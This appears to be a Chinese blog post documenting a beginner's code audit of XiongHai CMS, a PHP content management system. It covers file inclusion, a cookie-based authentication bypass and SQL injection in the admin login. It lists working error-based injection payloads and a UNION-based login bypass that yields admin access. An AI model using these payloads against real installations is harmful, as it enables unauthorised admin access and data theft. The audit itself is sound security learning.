熊海CMS

June 10, 2022 in category, subcategory

熊海CMS是一款不错的入门级CMS,很符合新手入门代码审计,等有了能力再去审计带有TP等框架的CMS,这时就会得心应手.

前言:

看到很多大佬都是熊海CMS入的门,为了更好的理解漏洞成因,所以准备入门代码审计

坑点:

  1. 我install填好信息后提交,结果页面一直是白的,翻了很多人的博客才发现是PHP的版本高了,建议使用7以下
  2. 一开始没打算用root用户创建表,用的自己创建的低权限用户y,后面就是提示Connect Error denied 提示权限不够,建议使用root

代码审计

  1. 文件包含漏洞

首页(index.php|admin/index.php)代码:


<?php
//单一入口模式
error_reporting(0); //关闭错误显示
$file=addslashes($_GET['r']); //接收文件名
$action=$file==''?'index':$file; //判断为空或者等于index
include('files/'.$action.'.php'); //载入相应文件
?>

从这里我们不难看出首页这里传进了一个参数,没有调用和匹配正则过滤用户传入的参数,所以我们可以尝试包含一下phpinfo试试看

  1. 越权(inc/checklogin.php) 代码

下面这段代码对Cookie进行了简单的验证,判断Cookie中user是不是用户名(要求是存在的用户名)

<?php
$user=$_COOKIE['user'];
if ($user==""){
header("Location: ?r=login");
exit;	
}
?>

这里我没有勾选上Cookie,它是会跳转到login 这里我勾选上Cookie,它会自动登录到admin账号的后台

  1. SQL注入(admin/file/login.php)
ob_start();
require '../inc/conn.php';
$login=$_POST['login'];
$user=$_POST['user'];
$password=$_POST['password'];
$checkbox=$_POST['checkbox'];

if ($login<>""){
$query = "SELECT * FROM manage WHERE user='$user'"; // 这里传入了参数,直接进行了拼接,而没有过滤
$result = mysql_query($query) or die('SQL语句有误：'.mysql_error()); // 这里开启了报错
$users = mysql_fetch_array($result);

直接通过POST方式接收user、password，并且没有做任何过滤。然后先查询用户名，如果用户名存在，就将将POST得到的密码进行md5，然后和数据库中对应的密码进行比较。这样的话，虽然我们可以通过万能密码admin’ or ‘1’=‘1对用户名绕过，但是密码没有方法绕过，万能密码的方法就不可行了。 不过由于没有做任何过滤，我们还是可以执行SQL语句的

这里我们可以修改源代码中的提示错误来判断是不是万能密码生效了,但是密码验证没过! 例如我们修改源码中的用户名与密码错误

然后再次尝试万能密码:admin' or '1' = '1

payload:

123' or updatexml(1,concat((select concat(0x7e,user) from manage)),0) #
1' or extractvalue(1,concat((select concat(0x7e,user) from manage)))#
1' or extractvalue(1,concat(0x7e,(select user from manage)))#
admin' or updatexml(1,concat(0x7e,(user()),0x7e),1); #
// 下面这个万能密码可以登入后台
1' union select 1,2,'test','c4ca4238a0b923820dcc509a6f75849b',5,6,7,8#'

万能密码登入后台: 可以先试试这个 payload在mysql中查询的结果 代码讲解: 这里最后一个框说的是判断最开始传入的密码和user中query取出的密码的md5值比较 那么只要利用 1' union select 1,2,'test','c4ca4238a0b923820dcc509a6f75849b',5,6,7,8#' 加上密码为第四个字段的md5值就可以了

$page=addslashes($_GET['page']);
